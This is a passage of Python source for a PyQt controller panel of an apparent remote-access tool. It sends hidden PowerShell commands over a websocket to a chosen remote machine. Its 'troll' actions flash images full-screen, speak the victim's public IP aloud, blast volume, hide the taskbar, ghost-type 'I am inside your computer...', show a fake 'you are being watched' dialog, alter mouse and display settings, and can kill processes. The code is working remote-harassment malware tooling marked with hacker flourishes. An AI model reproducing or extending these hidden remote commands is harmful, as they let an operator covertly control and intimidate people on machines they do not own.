                if not ok or not img_url.strip():
                    return
                img_url = img_url.strip()
            
            img_url_safe = img_url.replace("'", "''")
            cmd = (
                f'powershell -WindowStyle Hidden -Command "'
                f'Add-Type -AssemblyName System.Windows.Forms;'
                f' $f = New-Object System.Windows.Forms.Form;'
                f' $f.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None;'
                f' $f.WindowState = [System.Windows.Forms.FormWindowState]::Maximized;'
                f' $f.TopMost = $true; $f.BackColor = [System.Drawing.Color]::Black;'
                f' $pb = New-Object System.Windows.Forms.PictureBox;'
                f' $pb.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom;'
                f' $pb.Dock = [System.Windows.Forms.DockStyle]::Fill;'
                f' $f.Controls.Add($pb);'
                f' $req = [System.Net.WebRequest]::Create(\'{img_url_safe}\');'
                f' $res = $req.GetResponse();'
                f' $stream = $res.GetResponseStream();'
                f' $img = [System.Drawing.Image]::FromStream($stream);'
                f' $pb.Image = $img;'
                f' $res.Close();'
                f' $f.Show();'
                f' for($i=0; $i -lt 30; $i++) {{'
                f' if($i % 2 -eq 0) {{ $pb.Visible = $false }}'
                f' else {{ $pb.Visible = $true }};'
                f' $f.Refresh(); Start-Sleep -Milliseconds 50 }};'
                f' $f.Close()"'
            )
            label = '🖼️ Flash Image'

        elif action == 'say_ip':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -AssemblyName System.Speech;'
                ' $ip = (Invoke-WebRequest -Uri \'https://api.ipify.org\' -UseBasicParsing).Content;'
                ' $s = New-Object System.Speech.Synthesis.SpeechSynthesizer;'
                ' $s.Speak(\'Your IP address is \' + $ip)"'
            )
            label = '📢 Say IP Address'

        elif action == 'earrape':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '$wsh = New-Object -ComObject WScript.Shell;'
                ' for($i=0; $i -lt 50; $i++) { $wsh.SendKeys([char]175) };'
                ' for($i=0; $i -lt 15; $i++) {'
                ' [console]::beep($(Get-Random -Min 200 -Max 5000), 200) }"'
            )
            label = '🎵 Earrape'

        elif action == 'hide_taskbar':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class TB {'
                ' [DllImport(\\\"user32.dll\\\")] public static extern IntPtr FindWindow(string c, string w);'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int ShowWindow(IntPtr h, int s); }\';'
                ' $h = [TB]::FindWindow(\\\"Shell_TrayWnd\\\", \\\"\\\");'
                ' [TB]::ShowWindow($h, 0)"'
            )
            label = '🔀 Hide Taskbar'

        elif action == 'clippy':
            msg = custom_text or 'It looks like you are being watched! Would you like help?'
            msg_safe = msg.replace("'", "''")
            cmd = (
                f'powershell -WindowStyle Hidden -Command "'
                f"Add-Type -AssemblyName PresentationFramework;"
                f" [System.Windows.MessageBox]::Show("
                f"'{msg_safe}', '📎 Clippy', 'YesNo', 'Information')"
                f'"'
            )
            label = '📎 Clippy'

        elif action == 'invert_colors':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '$p = \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize\';'
                ' $v = (Get-ItemProperty -Path $p -Name AppsUseLightTheme -ErrorAction SilentlyContinue).AppsUseLightTheme;'
                ' if($v -eq 0) { Set-ItemProperty -Path $p -Name AppsUseLightTheme -Value 1;'
                ' Set-ItemProperty -Path $p -Name SystemUsesLightTheme -Value 1 }'
                ' else { Set-ItemProperty -Path $p -Name AppsUseLightTheme -Value 0;'
                ' Set-ItemProperty -Path $p -Name SystemUsesLightTheme -Value 0 }"'
            )
            label = '🖥️ Toggle Light/Dark Theme'

        elif action == 'slow_mouse':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Set-ItemProperty -Path \'HKCU:\\Control Panel\\Mouse\' -Name MouseSensitivity -Value 1;'
                ' rundll32.exe user32.dll,UpdatePerUserSystemParameters"'
            )
            label = '🐌 Slow Mouse'

        elif action == 'fast_mouse':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Set-ItemProperty -Path \'HKCU:\\Control Panel\\Mouse\' -Name MouseSensitivity -Value 20;'
                ' rundll32.exe user32.dll,UpdatePerUserSystemParameters"'
            )
            label = '🏎️ Fast Mouse'

        elif action == 'cd_tray':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                '$d = New-Object -ComObject IMAPI2.MsftDiscMaster2;'
                ' try { $r = New-Object -ComObject IMAPI2.MsftDiscRecorder2;'
                ' $r.InitializeDiscRecorder($d.Item(0)); $r.EjectMedia() }'
                ' catch { (New-Object -ComObject Shell.Application).Namespace(17).Items()'
                ' | ForEach-Object { $_.InvokeVerb(\\\"Eject\\\") } }"'
            )
            label = '📂 Eject CD Tray'

        elif action == 'ghost_type':
            msg = custom_text or 'I am inside your computer...'
            msg_safe = msg.replace("'", "''")
            cmd = (
                f'powershell -WindowStyle Hidden -Command "'
                f"$wsh = New-Object -ComObject WScript.Shell;"
                f" Start-Sleep -Seconds 2;"
                f" foreach($c in '{msg_safe}'.ToCharArray()) {{"
                f" $wsh.SendKeys([string]$c);"
                f" Start-Sleep -Milliseconds $(Get-Random -Min 50 -Max 200) }}"
                f'"'
            )
            label = f'🔤 Ghost Type: "{msg[:30]}"'

        elif action == 'fix_screen':
            cmd = (
                'powershell -WindowStyle Hidden -Command "'
                'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class DispRotate {'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int EnumDisplaySettings(string d, int m, ref DEVMODE dm);'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int ChangeDisplaySettingsEx(string d, ref DEVMODE dm, IntPtr h, int f, IntPtr p);'
                ' [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]'
                ' public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;'
                ' public short dmSpecVersion; public short dmDriverVersion; public short dmSize;'
                ' public short dmDriverExtra; public int dmFields; public int dmPositionX; public int dmPositionY;'
                ' public int dmDisplayOrientation; public int dmDisplayFixedOutput; public short dmColor;'
                ' public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate;'
                ' [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;'
                ' public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight;'
                ' public int dmDisplayFlags; public int dmDisplayFrequency; } }\';'
                ' $dm = New-Object DispRotate+DEVMODE; $dm.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($dm);'
                ' [DispRotate]::EnumDisplaySettings([NullString]::Value, -1, [ref]$dm);'
                ' $dm.dmDisplayOrientation = 0;'
                ' [DispRotate]::ChangeDisplaySettingsEx([NullString]::Value, [ref]$dm, [IntPtr]::Zero, 0, [IntPtr]::Zero)"'
            )
            label = '🔃 Fix Screen (0°)'

        elif action == 'reset_all':
            # Giant compound PowerShell that reverts every troll effect at once
            cmd = (
                'powershell -WindowStyle Hidden -Command "& {'
                # 1. Fix mouse buttons (un-swap)
                ' Set-ItemProperty -Path \'HKCU:\\Control Panel\\Mouse\' -Name SwapMouseButtons -Value 0;'
                # 2. Restore mouse speed to default (10)
                ' Set-ItemProperty -Path \'HKCU:\\Control Panel\\Mouse\' -Name MouseSensitivity -Value 10;'
                ' rundll32.exe user32.dll,UpdatePerUserSystemParameters;'
                # 3. Restore screen rotation to 0°
                ' Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class DispFix {'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int EnumDisplaySettings(string d, int m, ref DEVMODE dm);'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int ChangeDisplaySettingsEx(string d, ref DEVMODE dm, IntPtr h, int f, IntPtr p);'
                ' [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]'
                ' public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;'
                ' public short dmSpecVersion; public short dmDriverVersion; public short dmSize;'
                ' public short dmDriverExtra; public int dmFields; public int dmPositionX; public int dmPositionY;'
                ' public int dmDisplayOrientation; public int dmDisplayFixedOutput; public short dmColor;'
                ' public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate;'
                ' [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;'
                ' public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight;'
                ' public int dmDisplayFlags; public int dmDisplayFrequency; } }\';'
                ' $dm = New-Object DispFix+DEVMODE; $dm.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($dm);'
                ' [DispFix]::EnumDisplaySettings([NullString]::Value, -1, [ref]$dm);'
                ' $dm.dmDisplayOrientation = 0;'
                ' [DispFix]::ChangeDisplaySettingsEx([NullString]::Value, [ref]$dm, [IntPtr]::Zero, 0, [IntPtr]::Zero);'
                # 4. Show taskbar again
                ' Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class TBFix {'
                ' [DllImport(\\\"user32.dll\\\")] public static extern IntPtr FindWindow(string c, string w);'
                ' [DllImport(\\\"user32.dll\\\")] public static extern int ShowWindow(IntPtr h, int s); }\';'
                ' $h = [TBFix]::FindWindow(\\\"Shell_TrayWnd\\\", \\\"\\\");'
                ' [TBFix]::ShowWindow($h, 5);'
                # 5. Restore dark theme (default)
                ' $p = \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize\';'
                ' Set-ItemProperty -Path $p -Name AppsUseLightTheme -Value 0;'
                ' Set-ItemProperty -Path $p -Name SystemUsesLightTheme -Value 0;'
                # 6. Set volume to ~50% (25 volume-down presses from max, roughly mid)
                ' $wsh = New-Object -ComObject WScript.Shell;'
                ' for($i=0;$i -lt 50;$i++){$wsh.SendKeys([char]174)}; Start-Sleep -Milliseconds 200;'
                ' for($i=0;$i -lt 25;$i++){$wsh.SendKeys([char]175)};'
                # 7. Turn off caps lock if it's on
                ' Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices;'
                ' public class CapsOff {'
                ' [DllImport(\\\"user32.dll\\\")] public static extern short GetKeyState(int k); }\';'
                ' if([CapsOff]::GetKeyState(0x14) -band 1) {'
                ' $wsh.SendKeys(\\\"{CAPSLOCK}\\\") };'
                # 8. Un-mute (send mute toggle — best effort)
                ' $wsh.SendKeys([char]173);'
                ' }"'
            )
            label = '🔧 Reset All'

        if not cmd:
            self.show_warning(f'Unknown troll action: {action}')
            return

        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.selected_sender,
            'command': cmd,
            'requestId': '',
        }))
        self.show_warning(f'😈 Sent: {label} → {self.selected_sender}')

    def _update_fun_tab(self):
        """Called every second to refresh the Fun tab uptime label."""
        elapsed = int(time.time() - getattr(self, '_fun_start_time', time.time()))
        h = elapsed // 3600
        m = (elapsed % 3600) // 60
        s = elapsed % 60
        if h:
            txt = f'\u23f1  Session uptime: {h}h {m:02d}m {s:02d}s'
        elif m:
            txt = f'\u23f1  Session uptime: {m}m {s:02d}s'
        else:
            txt = f'\u23f1  Session uptime: {s}s'
        if hasattr(self, '_uptime_label'):
            self._uptime_label.setText(txt)

    def _next_hacker_quote(self):
        """Advance to the next hacker quote (with fade-style text color pulse)."""
        if not hasattr(self, '_quotes') or not self._quotes:
            return
        self._quote_idx = (self._quote_idx + 1) % len(self._quotes)
        if hasattr(self, '_quote_label'):
            self._quote_label.setText(self._quotes[self._quote_idx])
            # Brief highlight then back to normal
            self._quote_label.setStyleSheet(
                'color: #c4b5fd; font-style: italic; font-size: 8pt; padding: 4px;'
            )
            QTimer.singleShot(600, lambda: self._quote_label.setStyleSheet(
                'color: #818cf8; font-style: italic; font-size: 8pt; padding: 4px;'
            ) if hasattr(self, '_quote_label') else None)

    def _start_credits_at_top(self):
        """Initialize credits to start from top position."""
        if hasattr(self, 'credits_scroll'):
            self.credits_scroll.verticalScrollBar().setValue(0)

    def _scroll_credits_downward(self):
        """Auto-scroll the movie credits downward from top to bottom."""
        if hasattr(self, 'credits_scroll') and self.credits_scroll:
            max_value = self.credits_scroll.verticalScrollBar().maximum()
            current_value = self.credits_scroll.verticalScrollBar().value()
            
            # Scroll down (increase value moves content down)
            if current_value < max_value:
                self.credits_scroll.verticalScrollBar().setValue(current_value + 1)
            else:
                # Reset to top when reaching bottom
                self.credits_scroll.verticalScrollBar().setValue(0)

    def _spin_slot_machine(self):
        """Spin the slot machine with animation."""
        if self.is_spinning:
            return  # Prevent multiple spins
            
        self.is_spinning = True
        self.spin_button.setEnabled(False)
        self.spin_button.setText('SPINNING...')
        
        # Create spinning timer
        self.spin_timer = QTimer()
        self.spin_duration = 2000  # 2 seconds of spinning
        self.spin_start_time = QTimer.remainingTime if hasattr(QTimer, 'remainingTime') else lambda: 0
        
        # Start spinning animation
        self.spin_counter = 0
        self.spin_timer.timeout.connect(self._animate_spin)
        self.spin_timer.start(100)  # Change every 100ms for fast spinning
        
        # Stop spinning after duration
        QTimer.singleShot(self.spin_duration, self._stop_spinning)
    
    def _animate_spin(self):
        """Animate the spinning reels."""
        import random
        
        # Random symbols for each reel during spin
        reel1_symbol = random.choice(self.slot_symbols)
        reel2_symbol = random.choice(self.slot_symbols)
        reel3_symbol = random.choice(self.slot_symbols)
        
        # Update the reel labels
        self.reel1_label.setText(reel1_symbol)
        self.reel2_label.setText(reel2_symbol)
        self.reel3_label.setText(reel3_symbol)
        
        self.spin_counter += 1
    
    def _stop_spinning(self):
        """Stop spinning and show final result."""
        import random
        
        # Stop the animation timer
        if hasattr(self, 'spin_timer'):
            self.spin_timer.stop()
        
        # Set final random symbols
        reel1_symbol = random.choice(self.slot_symbols)
        reel2_symbol = random.choice(self.slot_symbols)
        reel3_symbol = random.choice(self.slot_symbols)
        
        # Update the reel labels with final result
        self.reel1_label.setText(reel1_symbol)
        self.reel2_label.setText(reel2_symbol)
        self.reel3_label.setText(reel3_symbol)
        
        # Check for win (all three symbols match)
        if reel1_symbol == reel2_symbol == reel3_symbol:
            self.spin_button.setText('🎉 JACKPOT! 🎉')
            self.spin_button.setStyleSheet('''
                QPushButton {
                    background: #fbbf24;
                    color: #000000;
                    border: none;
                    border-radius: 6px;
                    padding: 12px 32px;
                    font-size: 14px;
                    font-weight: 600;
                }
                QPushButton:hover {
                    background: #f59e0b;
                }
            ''')
        else:
            self._reset_button()
        
        # Re-enable button and reset spinning state
        QTimer.singleShot(2000, lambda: self._reset_button())
        self.is_spinning = False
    
    def _reset_button(self):
        """Reset button to normal state after showing result."""
        self.spin_button.setEnabled(True)
        self.spin_button.setText('SPIN')
        self.spin_button.setStyleSheet('''
            QPushButton {
                background: #818cf8;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 12px 32px;
                font-size: 14px;
                font-weight: 600;
            }
            QPushButton:hover {
                background: #6366f1;
            }
            QPushButton:pressed {
                background: #4f46e5;
            }
            QPushButton:disabled {
                background: #4a5568;
                color: #a0aec0;
            }
        ''')

    def closeEvent(self, event):
        self.settings.setValue("geometry", self.saveGeometry())
        self.settings.setValue("windowState", self.saveState())
        if hasattr(self, 'detail_splitter'):
            self.settings.setValue("detail_splitter", self.detail_splitter.sizes())
        if hasattr(self, 'main_splitter'):
            self.settings.setValue("main_splitter", self.main_splitter.sizes())
        # pyre-ignore[16]
        event.accept()

    def create_remote_panel(self):
        group = QGroupBox()
        layout = QFormLayout()
        self.mouse_center_btn = QPushButton('Move Mouse Center')
        self.mouse_left_btn = QPushButton('Left Click')
        self.mouse_right_btn = QPushButton('Right Click')
        self.key_input = QLineEdit()
        self.key_send_btn = QPushButton('Send Key')
        self.kill_pid_input = QLineEdit()
        self.kill_pid_btn = QPushButton('Kill Process')
        layout.addRow(self.mouse_center_btn)
        layout.addRow(self.mouse_left_btn)
        layout.addRow(self.mouse_right_btn)
        layout.addRow('Key:', self.key_input)
        layout.addRow(self.key_send_btn)
        layout.addRow('PID:', self.kill_pid_input)
        layout.addRow(self.kill_pid_btn)
        group.setLayout(layout)
        return group

def main():
    app = QAsyncApplication(sys.argv)

    # Apply modern font
    app.setFont(QFont("Segoe UI", 10))
    app.setStyle("Fusion")

    # Modern dark palette
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(18, 19, 23))
    palette.setColor(QPalette.WindowText, Qt.white)
    palette.setColor(QPalette.Base, QColor(30, 31, 36))
    palette.setColor(QPalette.AlternateBase, QColor(24, 25, 30))
    palette.setColor(QPalette.ToolTipBase, QColor(30, 31, 36))
    palette.setColor(QPalette.ToolTipText, Qt.white)
    palette.setColor(QPalette.Text, Qt.white)
    palette.setColor(QPalette.Button, QColor(40, 42, 54))
    palette.setColor(QPalette.ButtonText, Qt.white)
    palette.setColor(QPalette.BrightText, Qt.red)
    palette.setColor(QPalette.Link, QColor(88, 101, 242))
    palette.setColor(QPalette.Highlight, QColor(88, 101, 242))
    palette.setColor(QPalette.HighlightedText, Qt.white)
    app.setPalette(palette)

    style_sheet = """
        QMainWindow { background-color: #12131a; }

        /* ── Tab pane ── */
        QTabWidget::pane {
            border: 1px solid #2e3040;
            border-radius: 6px;
            background-color: #1a1b22;
        }
        QTabBar::tab {
            background-color: #22232d;
            color: #9a9cb0;
            padding: 9px 14px;
            border-top-left-radius: 7px;
            border-top-right-radius: 7px;
            border: 1px solid #2e3040;
            border-bottom: none;
            margin-right: 3px;
            margin-top: 4px;
            font-weight: 500;
        }
        #sidebar_tabs QTabBar::tab {
            max-width: 80px;
            min-width: 36px;
            padding: 7px 8px;
            font-size: 9pt;
        }
        QTabBar::tab:selected {
            background-color: #1a1b22;
            color: #ffffff;
            font-weight: bold;
            border-bottom: 2px solid #5865F2;
        }
        QTabBar::tab:hover:!selected { background-color: #2a2b36; }

        /* ── Buttons ── */
        QPushButton {
            background-color: #5865F2;
            color: white;
            border-radius: 5px;
            padding: 6px 16px;
            font-weight: bold;
            border: none;
        }
        QPushButton:hover { background-color: #6c7af4; }
        QPushButton:pressed { background-color: #4752c4; }
        QPushButton:checked { background-color: #4752c4; border: 1px solid #7289da; }
        QPushButton:disabled { background-color: #2e3040; color: #686a80; }

        /* ── Inputs ── */
        QLineEdit, QTextEdit, QComboBox {
            background-color: #22232d;
            border: 1px solid #3a3c4e;
            border-radius: 5px;
            padding: 5px 8px;
            color: #e8e9f5;
        }
        QLineEdit:focus, QTextEdit:focus, QComboBox:focus {
            border: 1px solid #5865F2;
        }
        QComboBox::drop-down {
            border: none;
            width: 20px;
        }
        QComboBox::down-arrow {
            image: none;
            border-left: 4px solid transparent;
            border-right: 4px solid transparent;
            border-top: 5px solid #9a9cb0;
            margin-right: 6px;
        }
        QComboBox QAbstractItemView {
            background-color: #22232d;
            border: 1px solid #3a3c4e;
            selection-background-color: #5865F2;
            color: #e8e9f5;
        }

        /* ── List widgets ── */
        QListWidget {
            background-color: #1e1f28;
            border: 1px solid #3a3c4e;
            border-radius: 5px;
            padding: 4px;
            color: #e8e9f5;
            outline: none;
        }
        QListWidget::item {
            border-radius: 4px;
            padding: 4px 6px;
        }
        QListWidget::item:hover { background-color: #2a2b38; }
        QListWidget::item:selected { background-color: #5865F2; color: white; }

        /* ── Group boxes ── */
        QGroupBox {
            border: 1px solid #3a3c4e;
            border-radius: 8px;
            margin-top: 14px;
            padding-top: 20px;
            font-weight: bold;
            font-size: 9pt;
        }
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 12px;
            padding: 0 6px;
            color: #9a9cb0;
        }

        /* ── Splitter ── */
        QSplitter::handle {
            background-color: #2e3040;
            width: 3px;
        }
        QSplitter::handle:hover { background-color: #5865F2; }

        /* ── Scrollbar ── */
        QScrollBar:vertical {
            background: #1a1b22;
            width: 10px;
            margin: 0;
            border-radius: 5px;
        }
        QScrollBar::handle:vertical {
            background: #3a3c4e;
            min-height: 24px;
            border-radius: 5px;
            margin: 2px;
        }
        QScrollBar::handle:vertical:hover { background: #5865F2; }
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }
        QScrollBar:horizontal {
            background: #1a1b22;
            height: 10px;
            border-radius: 5px;
        }
        QScrollBar::handle:horizontal {
            background: #3a3c4e;
            min-width: 24px;
            border-radius: 5px;
            margin: 2px;
        }
        QScrollBar::handle:horizontal:hover { background: #5865F2; }
        QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal { width: 0; }

        /* ── Progress bars ── */
        QProgressBar {
            border: none;
            border-radius: 5px;
            text-align: center;
            background-color: #22232d;
            color: #ffffff;
            font-weight: bold;
            font-size: 9pt;
            min-height: 20px;
        }
        QProgressBar::chunk {
            background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #5865F2, stop:1 #7289da);
            border-radius: 5px;
        }

        /* ── Tooltips ── */
        QToolTip {
            background-color: #22232d;
            color: #e8e9f5;
            border: 1px solid #5865F2;
            border-radius: 4px;
            padding: 4px 8px;
        }
    """
    app.setStyleSheet(style_sheet)
    
    loop = QEventLoop(app)
    asyncio.set_event_loop(loop)

    # ── Authentication gate ──
    # We use a holder list so the nested callback can store the window reference.
    _holder = {}

    def _show_login():
        login = LoginDialog()
        _holder['login'] = login

        def _on_login_finished(result):
            if result == QDialog.Accepted and login.was_authenticated():
                window = ViewerWindow()
                window.ws_url = login.result_url
                window.room_id = login.result_room
                window.secret = login.result_secret
                if hasattr(window, 'ws_url_input'):
                    window.ws_url_input.setText(login.result_url)
                if hasattr(window, 'room_id_input'):
                    window.room_id_input.setText(login.result_room)
                if hasattr(window, 'secret_input'):
                    window.secret_input.setText(login.result_secret)
                _holder['window'] = window
                window.show()
            else:
                app.quit()

        login.finished.connect(_on_login_finished)
        login.show()

    QTimer.singleShot(0, _show_login)

    with loop:
        loop.run_forever()

if __name__ == '__main__':
    main()
